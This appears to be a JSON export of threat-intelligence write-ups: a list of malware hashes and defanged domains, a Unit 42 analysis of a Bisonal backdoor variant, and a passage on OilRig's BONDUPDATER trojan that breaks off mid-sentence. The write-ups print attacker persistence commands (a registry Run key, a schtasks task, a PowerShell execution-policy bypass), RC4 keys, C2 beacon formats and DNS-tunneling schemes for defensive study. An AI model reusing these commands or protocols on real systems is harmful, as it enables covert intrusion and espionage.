                "3d59703fb58265b07ae1cb26750baba733e304f5540a6824329b7ff6f7ab3efe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b02585dd5399047daf3bccd9d7ed5cc69b0fc23b4709e9270c9f09f67c0a23bc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d18e84f86d7a8cfd246baa1684517d69e411780f9da6b8e3ddb99a61c8d0947a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c4fd31ab40e6cb2ebf75d5dc81045ebc38a8825def3f1696a539c32e5ec5b353"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9c6b8eb7c007abc681ceb67da5b1c7533055bb9985236abb46ec6f7e0b14e03e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1e8a5cb9c019dd649564efe4157a90a6f980fd1f0f75c596f20c02e08462373"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8443d7bbd02bed691ba1ce55ea0660601c5f10256cbfafd410de41ab2cd4d047"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ade725bed78f8a8f0c9a612ee22ea716e3caeacbe16726f9726b39d74e5f3c18"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a94e82793f458b81707e005ba1298022a6b7ca0c07869884750d121a06401689"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3466d46a970b77cd14cf5c6c8587f522c9b823c8b28abf87a66b07e32041e5c1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d906118fb36a0cc4e83121d4d606ad685645252e8e0791f793057499d8751bf0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a8acd988089e7f9dd04f971374f766db519e854d42e8052b0d98b4c9c6b67e4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "122f4d69497a162a942d8f400dabbe93ae0a326a022886bf6c9c45d23c299f96"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ce98ab10089a9ef089941e48fe4cdf1af5c8a3df358f870d933668bbfb2f330e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a713f5c0089a5ef9b2da40fa8cfe06aad73cc836f337c772b1c7d30d70a6c5ed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7fd71102743bf9212b96368597be396a1a22a49a1ec011f1c607533bdefc94bb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "46f3afae22e83344e4311482a9987ed851b2de282e8127f64d5901ac945713c0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a7c30a18a3840a97c1ce0130b55ef3f514952233dfcc8662a9e66c6029f95ba9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "86ede9ee62785fb11f4c6c95937d6d5bc6bb16c0d3b90ffeeab719b59f7d4e61"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "30282a807c2ee27b0d1dda310e41487f5018bc5fc5df8af6c13d08df34f2b6df"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f36048ea70f70c4adde2d93819e7aa8652ab2761e598cafb1ea871b6730dbad3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf53fc8c9ce4e5797cc5ac6f71d4cbc0f2b15f2ed43f38048a5273f40bc09876"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8f82649ca0e9d1d48ec58a9e2e8431ddda0dc62db1a6d2cd9ec29afa7d59abc3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "358b0d6fc23b4984b51deb81ce89c110582e1730bd1eb163f633e1ed9e3388ee"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89bb38d54a80b460ea2744b7c5af02a1823939b55990ccd31c06d7ef040d29f3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4a2ef9663f0d5fdfa551e3d31af6dbcffdc78ea02c0fb963b5486daee78421bc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "27752bbb01abc6abf50e1da3a59fefcce59618016619d68690e71ad9d4a3c247"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc7558abd0b196a2c070db98268ed00dff186d609e23a93c03640dcc478db2eb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "46dd5deda642d4a8cf628d865483e82279cce2846106b830d45b64e1e19727dd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5c47ed83e47f1bdde8c1ebc3d6193fef190c3934fb2239e84950ae5c073eb808"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cc8020c36156c7e5c8cfbbb32bc8d7f03536510f4e3b38b22e0abdb9ad90c90e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "39b825e400ea17215d6efc5ae425759bbfd3cd8569451680fbf782cfedbec0c5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "050610cfb3d3100841685826273546c829335a5f4e2e4260461b88367ad9502c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "08b32da8995ae094bfb703d7d975c3816cf04c075c32281e51158164d76cd655"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "24fe39572ee425e30c018947a1422342479a3d664d1a8d2ab28cef656394073a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1a65e43afaaff90b4124cbef21fadc319f10fba4843d09837219400b0dbcc285"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "087941d80baca00501739abf0b8450dce723733ea8866589fa9779481e7a6cfb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "285998bce9692e46652529685775aa05e3a5cb93ee4e65d021d2231256e92813"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c9c4263ac3287aa48d8cf03fdbb32a179cfd8c08d1c1a39696d8c932603e8df9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bc8b240c89304c12dce75076f9fcc2859f48ec01347f9cc0a4cb9fbcb77ed089"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2349d745d84db772d97c599e6150ff4585a69d915deb6d6e6601e412651164f3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2941f75da0574c21e4772f015ef38bb623dd4d0c81c263523d431b0114dd847e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "69424f5e0bd974271f367fae04179de4efe233d56ad81840a3c3936eaa244502"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a793a401277b307c3b056a725672d81b71492cb564d6db2445a9c30724f61d72"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "68ba2fa76ef3b3c905f26dae3c75a6b5e165b4246cb4f574c07ad70013b265ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b2d203b927507176606a6616ba8b8729050ecaff0790a9deb37df32caab7d613"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2c64a3d6b896ee1b58b9cf55531b7256de45025d60b1f4be764b385de087b52f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a1a5abab16c9de1c69c4a7e731c0f13c9bb8ce90dab15546807cae039c7f9385"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ece76fdf7e33d05a757ef5ed020140d9367c7319022a889923bbfacccb58f4d7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "106deff16a93c4a4624fe96e3274e1432921c56d5a430834775e5b98861c00ea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pal4u[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pal2me[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shop8d[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ts4shope[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pal4news[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ads4market[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "wp.piedslibres[.]com (hijacked legitimate site)"
            ]
        }
    ],
    "6819abde8c2b9cf20f69a0f8512f2ac5719ca701": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nIn early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware.",
                "While not previously publicly documented, the variant has been in the wild since at least 2014.",
                "There are three primary differences between it and older Bisonal malware including a different cipher and encryption for C2 communication, and a large rewrite of the code for both network communication and maintaining persistence.",
                "To date, we have only collected 14 samples of this variant, indicating it may be sparingly used.",
                "The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF files contents.",
                "Attacks using Bisonal have been blogged about in the past.",
                "In 2013, both COSEINC and FireEye revealed attacks using Bisonal against Japanese organizations .",
                "In October 2017, AhnLab published a report called Operation Bitter Biscuit, an attack campaign against South Korea, Japan, India and Russia using Bisonal and its successors, Bioazih and Dexbia.",
                "We believe it is likely these tools are being used by one group of attackers.",
                "Though Bisonal malware has been in the wild for at least seven years and frequently updated, the actors keep using same high-level playbooks.",
                "Common features of attacks involving Bisonal include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed all these characteristics in the latest attacks against both Russia and South Korea."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While investigating attack campaigns, Unit 42 discovered a targeted attack against at least one organization in Russia which provides communication security services and products.",
                "The targeted organization specialises in encryption and cryptographic services and develops a broad number of secure communication products which also includes telecommunication systems and data protection facilities.",
                "Given the sensitivity of the products being developed by the target organization, it is not a surprise to see a targeted attack towards the organisation by a known threat actor.",
                "Figure 1 shows the spear-phishing email sent to the target organization.",
                "The email was spoofed to look like it was sent from Rostec, a Russian state corporation that promotes the development, production and export of high-tech industrial products.",
                "The contents of the email suggest it was sent from the legal support and corporate governance department of Rostec and includes project details aimed at improving the housing conditions of defence industry workers.",
                "It is interesting to note there is a relationship between the target company and Rostec: the attackers may be trying to exploit the relationship between Rostec and the target to add an additional air of legitimacy to the attack."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Spear-phishing email sent to the Russian company"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Below is the translation from Russian into English by Google Translate.\n\u00a0\nSubject:\nA comprehensive project to create housing and construction cooperatives for defence workers\n\u00a0\nBody:\nGood afternoon, dear colleagues!",
                "By the May Day, I am sending you a comprehensive project aimed at improving the housing conditions of defence industry workers\nCongratulations!\n\u00a0\nAttachment:\nComprehensive project for the creation of housing construction cooperatives for defence workers .exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see in Figure 1, some email clients do not display the attachment as the PDF.",
                "However, if you save the file on the computer, it looks like a PDF document because the executable file has the PDF icon in the resource.",
                "Once the malicious executable attachment is opened, the main payload is dropped in the victim machine and displays a decoy file to the victim.",
                "Figure 2 shows the contents of the decoy file which is a PDF whose contents are an exact match to an article published on Rostecs website on January 30th, 2018.",
                "The article discusses new housing project plans by Rostec and other state departments, and the benefits to the defence industry workers who are eligible for free housing under the project."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy pdf file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon further analysis of the malware payload, we determined it is part of the Bisonal malware family.",
                "Since the details of the malware family have already been published, we will discuss some of the unique indicators and techniques the threat actor behind Bisonalemployed in this campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware Analysis\nMalware Dropper\nThe dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body.",
                "Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, 34123412, saves them in the path shown below and executes them."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1. File hashes and paths targeting Russia"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper then creates following registry entry to execute the Bisonal sample when the computer reboots:\nHKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\vert = rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bisonal main module\nThe DLL (pvcu.dll) is Bisonal malware but using a different cipher for C2 communication that other publicly documented samples.",
                "Booz Allen Hamilton in 2014 and AhnLab in 2015 reported on Bisonal using a simple XOR cipher to hide the C2 address strings in the body.",
                "The Bisonal sample we observed in this case employs the RC4 cipher with the key 78563412.",
                "To date, all Bisonal samples we have seen using RC4 use this same key.",
                "The oldest sample we have dates to 2014, so this variant has been in the wild for several years.",
                "Adding to the change in encryption type, a large part of the code such as network communication procedures, and the persistence method have been re-written.",
                "For example, the Bisonal malware in 2012 used send() and recv()",
                "APIs to communicate with its C2.",
                "For this variant, the developer wholly recreated C2 code from scratch by using other network APIs, such as HttpSendRequest() and InternetReadFile().",
                "This Bisonal variant used in the latest attack communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These domains are provided by a free DDNS service and both resolve to the same IP address, 116.193.155[.]38.",
                "When this Bisonal variant communicates with its C2, the malware sends an HTTP POST request with the static strings ks8d and akspbu.txt, and the IP address of the compromised machine.",
                "Figure 3 shows the initial HTTP POST request to the C2 server."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Initial network C2 beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Readers may notice the missing closing parenthesis in the User Agent request header.",
                "That string is hardcoded in this malware variant.",
                "We have more than 230 samples of Bisonal in total and only 14 samples since 2014 use this incomplete User Agent string.",
                "It is unclear whether the author forgot to add closing parenthesis while developing the code, or intentionally use this string for validating the connection to the C2 server.",
                "Either way, it can be a good Indicator in network logs for a possible Bisonal infection.\n\nC2 Communication\nAnother sign of the infection is the data being sent to the C2 server during the initial connection.",
                "Every time this variant of Bisonal communicates with its C2, it sends a unique id number and backdoor command in the first eight bytes.",
                "The malware sends hardcoded DWORD values (0x10000 and 0x3E7) just for the initial connection and receives updated values from the C2 and uses them for further communication.",
                "As described above, all communications between this Bisonal variant and C2 are encrypted by RC4 cipher with the static key 78563412.",
                "As the result of enciphering static values, the backdoor always sends identical eight bytes of data (81b2a8977ea31b91) to the C2 first.",
                "Soon after receiving the initial beacon from the victim infected with Bisonal, the C2 replies with a session id number and backdoor command.",
                "The session id number is consistent throughout the C2 communication.",
                "The malware then processes the given command on the compromised system and sends the result back to C2 with the session id number and the backdoor command number.",
                "Then the C2 replies with that same session id number.",
                "The backdoor waits five seconds and restarts communication with the C2 with the same session id number.",
                "Below is an example of the reply to the command, get system info.",
                "The actual traffic between the C2 and Bisonal sample is on the left side, and the decrypted payload is on the right side.",
                "The first DWORD (four bytes) is the given session id, 0x00000003, and the next DWORD is a backdoor command, 0x000000C8.",
                "At offset 8 of the decrypted payload, there is a campaign or target code.",
                "In this sample, it is 0425god."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Decrypted payload showing the target/campaign code"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Following is the diagram of the session between Bisonal and C2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5. Bisonal C2 communication flow"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table shows the list of backdoor commands this sample supports."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Backdoor commands"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Strong Interests in Cyrillic\nPrevious reports have discussed Bisonal malware used in attacks against Japan, South Korea and Russia.",
                "This particular sample we found targeted an organization in Russia and there is a specific system language check for Cyrillic and no others.",
                "When the backdoor receives the shell access command, it checks the code page of the compromised system.",
                "If its Cyrillic and the command to the shell is not ipconfig, the threat converts the command result text encoding from Cyrillic to UTF-16.",
                "For any other code page the malware presumes the resulting text as default Windows ANSI code page and also converts it to UTF-16.",
                "It is not known why the malware author called out Cyrillic specifically when the malware would convert any text to UTF-16.",
                "Windows ANSI code pages supports ASCII characters and non-ASCII values as the international characters depends on the OS language.",
                "UTF-16 can support maximum 1 million characters in Unicode.",
                "To avoid corrupting Cyrillic (and other language) characters in the results, the developer added the code to the malware."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Checking of Cyrillic character set"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This Cyrillic/ipconfig checks in the shell access backdoor command exists in some original Bisonal samples found in 2012.",
                "The sample (43459f5117bee7b49f2cee7ce934471e01fb2aa2856f230943460e14e19183a6) contains the marker string bisonal which is the origin of the malware name.",
                "This is one of the many reasons we strongly believe the latest samples are variants of Bisonal."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7. 'bisonal' marker string"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Targeting South Korea\nWhile investigating other Bisonal samples we found another dropper submitted to an online malware database on March 6.",
                "The original file name was 2018   (7 9) (2018.03.05).pdf.exe.",
                "This translates to 2018 Korean Coast Guard Government Employee (Grade 7, Grade 9).pdf.exe in English.",
                "Similar to the Bisonal variant targeting the Russian organization, this sample was also disguised as PDF document."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8.",
                "Malware disguised as PDF"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper executable installs Bisonal and a decoy file in the paths shown in Table 3, below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3, File hashes and system installation paths targeting South Korea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Though the functionality of the two dropper samples look very similar, the dropper code of this sample is completely different from the Russian targeting sample described above."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The contents of the decoy PDF is a job descriptions with the South Korean Coast Guard.",
                "The original document was a Hangul Word Processor(HWP) file posted on the South Korean Coast Guard website on March 5, 2018.",
                "Based on the metadata we found in the PDF, we strongly believe that the attacker converted the HWP to PDF. Figure 8, below, shows metadata added to the decoy file when converting the original file to PDF.",
                "The metadata indicates that the file was created with Adobe Distiller 8.00 (Windows) on March 6 by  (Cho Young Tae in English).",
                "Interestingly, the same creator name is found in the decoy PDF file of another sample of the Bisonal variant (dfa1ad6083aa06b82edfa672925bb78c16d4e8cb2510cbe18ea1cf598e7f2722) submitted to an online malware database in September 2014.",
                "This decoy is a contact list of Agriculture, Food, Rural Affairs, Oceans and Fisheries Committee of the National Assembly of the Republic of Korea.",
                "According to the metadata, this file is also converted from an HWP document with same tool by same creator.",
                "Though we dont know whether the creator is real or fake information, we can say the attacker has not changed this tool and technique for years."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8.",
                "Metadata in the decoy file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Main EXE\nThe installed EXE file is almost exactly the same as the DLL version of Bisonal variant used against the Russian organization.",
                "Following is a brief write-up of the Bisonal EXEs behavior.",
                "There are only three differences from the DLL sample; creating a registry entry by itself, the C2 domain and the target or campaign code.",
                "The EXEs behavior is discussed below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Following table is the summary of the Bisonal samples described in this article."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4 Summary of the Bisonal samples in this blog"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe attackers behind Bisonal have been active for at least 7 years, and the variant used against the Russian and South Korean targets discussed in this blog in the wild since 2014.",
                "Since the attackers frequently rewrite functions from scratch and avoid reusing infrastructures, some samples look very different from original Bisonal malware.",
                "However, as we discussed in this blog, the same original piece of code referencing the malware name \"bisonal\" remains in at least some samples.",
                "We are still investigating the connection between the latest attacks discussed in this blog and the previous Bisonal attacks reported by industry colleagues.",
                "The high-level TTPs of the adversary behind these Bisonal samples matches with previous Bisonal activity.",
                "The targets are military or defense industry in particular countries, it used DDNS for C2 servers, and tracked connections from their victims by using target or campaign codes, as well as disguising the malware as document file, and using a dropper to install the malware and decoy file.",
                "We currently believe one group is behind these attacks, and we continue to investigate.",
                "Palo Alto Networks customers are protected from this threat by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IoC\nDropper SHA256:\nB1DA7E1963DC09C325BA3EA2442A54AFEA02929EC26477A1B120AE44368082F8\n0641FE04713FBDAD272A6F8E9B44631B7554DFD1E1332A8AFA767D845A90B3FA"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bisonal SHA256:\n43459F5117BEE7B49F2CEE7CE934471E01FB2AA2856F230943460E14E19183A6\nDFA1AD6083AA06B82EDFA672925BB78C16D4E8CB2510CBE18EA1CF598E7F2722\n1128D10347DD602ECD3228FAA389ADD11415BF6936E2328101311264547AFA75\n359835C4A9DBE2D95E483464659744409E877CB6F5D791DAA33FD601A01376FC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2:\njennifer998.lookin[.]at\n196.44.49[.]154\nwww.hosting.tempors[.]com\nkted56erhg.dynssl[.]com\neuiro8966.organiccrap[.]com\n116.193.155[.]38\ngames.my-homeip[.]com"
            ]
        }
    ],
    "15b0cd8ceb78e05421711aed3da57d065ae4a9c8": [
        {
            "type": "paragraph",
            "content": [
                "The OilRig group has been active since at least mid-2016, and continues their attack campaigns throughout the Middle East, targeting both governmental agencies and businesses on an almost routine basis.",
                "Often preferring homegrown tools and malware, OilRig continually modifies their malware and tools to accomplish their objectives.",
                "In August 2018, Unit 42 observed OilRig targeting a government organization using spear-phishing emails to deliver an updated version of a Trojan known as BONDUPDATER.",
                "BONDUPDATER is a PowerShell-based Trojan first discovered by FireEye in mid-November 2017, when OilRig targeted a different Middle Eastern governmental organization."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BONDUPDATER Trojan contains basic backdoor functionality, allowing threat actors to upload and download files, as well as the ability to execute commands.",
                "BONDUPDATER, like other OilRig tools, uses DNS tunneling to communicate with its C2 server.",
                "During the past month, Unit 42 observed several attacks against a Middle Eastern government leveraging an updated version of the BONDUPDATER malware, which now includes the ability to use TXT records within its DNS tunneling protocol for its C2 communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A New Series of Attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In mid-August, the Oilrig threat group sent what appeared to be a highly targeted phishing email to a high-ranking office in a Middle Eastern nation.",
                "The email had no subject and what initially drew our attention to this attack was the content of the spear phishing email."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Spear phishing email sent by the Oilrig threat group"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attached to the email was a malicious document named N56.15.doc (SHA256: 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) which contained a macro that attempted to install a new version of the BONDUPDATER Trojan."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. Microsoft Word document with embedded macros and PowerShell"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Updated BONDUPDATER"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The spear-phishing email had an attached Microsoft Word document that contained a macro responsible for installing a new variant of BONDUPDATER.",
                "The macro begins this installation process by creating two files on the system at the following location:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\AppPool.vbs (SHA256: c0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\AppPool.ps1 (SHA256: d5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro finishes by running the dropped VBScript \"AppPool.vbs\" file by running \"wscript C:\\ProgramData\\WindowsAppPool\\AppPool.vbs\".",
                "When first executed, the \"AppPool.vbs\" file will create the following scheduled task to execute every minute, which provides BONDUPDATER persistence and the ability to continually run on the system as the Trojan does not have a main loop to carry out its functionality:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cmd.exe /C schtasks",
                "/create",
                "/F",
                "/sc minute /mo 1 /tn \"\\WindowsAppPool\\AppPool\" /tr \"wscript /b",
                "\"C:\\ProgramData\\WindowsAppPool\\AppPool.vbs\"\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After creating the scheduled task, the VBScript will execute the \"AppPool.ps1\" script dropped by the macro using the following command line:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PowerShell.exe -exec bypass -file C:\\ProgramData\\WindowsAppPool\\AppPool.ps1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Subsequent executions of \"AppPool.vbs\" will check for the existence of a file named \"quid\", which, if present, will also use the above PowerShell script to run \"AppPool.ps1\".",
                "The PowerShell script creates the \"quid\" file upon its first execution to avoid creating multiple scheduled tasks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"AppPool.ps1\" file is a PowerShell script that is a variant of the BONDUPDATER payload.",
                "BONDUPDATER, like other OilRig payloads, uses DNS tunneling to communicate with its C2 server.",
                "This variant of the BONDUPDATER Trojan has a new lock file, which involves creating a lock file at the following location which will write the current PowerShell process identifier (PID) to this file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\lock"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The purpose of this lock file is to only have one instance of the Trojan running at one time.",
                "However, it also uses this lock file to determine how long the PowerShell process has been executing, as it checks the creation time of the file lock against the current time to determine if the PowerShell process has been running for more than ten minutes.",
                "If it has, the script will stop the process based on the PID in the lock file and delete the lock file.",
                "Future executions of the PowerShell script will fully execute as the lock file will no longer exist on the system.",
                "This suggests the threat actors may have experienced issues with this Trojan running for extended periods in the past, likely related to the communication loops that we will discuss later."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This BONDUPDATER variant also creates the following file that it will use to store a unique identifier for the system, which is generated by obtaining a random number between 10 and 99 and appending the first 8 characters of a generated GUID:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\quid"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BONDUPDATER Trojan then creates several folders that it will use to store files it receives from the C2 server and files that it generates or gathers to send to the C2 server.",
                "The folder names are:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\<unique ID from quid file>\\receivebox"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\<unique ID from quid file>\\sendbox"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\WindowsAppPool\\<unique ID from quid file>\\done"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Even though the script creates the \"files\" folder, it does not appear that the Trojan uses these folders within the code.",
                "The Trojan uses the \"receivebox\" folder to store files obtained from the C2 server, while the \"sendbox\" folder is used to store files that the Trojan will upload to the server.",
                "The Trojan uses the filenames of the file received from the C2 server stored in the \"receivebox\" folder to determine how to handle the file, which is explained below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BONDUPDATER sample retains its original command handling and C2 communication functionality.",
                "This process involves communicating with the C2 server to receive a file and using a character in the filename as the command.",
                "The Trojan's command handler checks the trailing character of the filename to process the file contents, which can be seen in Table 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Commands available in BONDUPDATER and their purpose"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After handling the command, BONDUPDATER will send files it saved in the \"sendbox\" folder to the C2 server, after which it terminates and relies on the scheduled task to run again in the future."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As discussed above, the BONDUPDATER Trojan uses a DNS tunneling protocol to receive files from the C2 server for processing.",
                "This particular BONDUPDATER sample includes two different variations of the DNS tunneling protocol, one using DNS A records, and one using DNS TXT records to transmit data from the C2 to the Trojan.",
                "The use of TXT records for C2 communications appears to be a new feature to the BONDUPDATER Trojan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DNS tunneling protocol uses carefully crafted subdomains sent to the authoritative name server of the C2 domain, which in this specific sample was the domain \"withyourface[.]com\".",
                "The Trojan generates subdomains differently when it sends data to the C2 compared to when it is looking to receive data from the C2, regardless of which DNS tunneling protocol is used for communications.",
                "The format of the generated domains for both sending and receiving starts with the previously generated GUID created to uniquely identify the system.",
                "However, the Trojan inserts a part number value and an action type character into this GUID string at random offsets.",
                "The part number value is a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit.",
                "The action type is a single character that notifies the C2 the type of communication the Trojan is carrying out.",
                "The two static characters \"C\" and \"T\" in the subdomain surround two digits, which help the C2 server find the part number and action type mixed in within the GUID string at random offsets."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sending data format"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<GUID with part number and action character><sequence number><between",
                "1 and 7 random characters>C<index of part number><index of action>T.<data chunk>.<filename>.<c2",
                "domain>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Receiving data format"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<GUID with part number and action character><sequence number><between",
                "1 and 7 random characters>C<index of part number><index of action>T.<c2 domain>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Depending on whether the C2 communications use DNS A or TXT records, different action types are used when generating the subdomains to notify the C2 what format to use to respond.",
                "Table 2 shows action types used in outbound requests and the purpose of the request."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Action types used within the DNS tunneling protocol and their purpose"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For example, the Trojan will begin communicating with its C2 server by sending an initial beacon with the action character \"M\".",
                "This initial beacon will follow the receiving format, as seen in the following example:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Example domain for the C2 beacon with its format explained"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The offset to the part number and action type in the GUID above may not seem correct at first, as the action type does not appear to be at offset 8 in the string.",
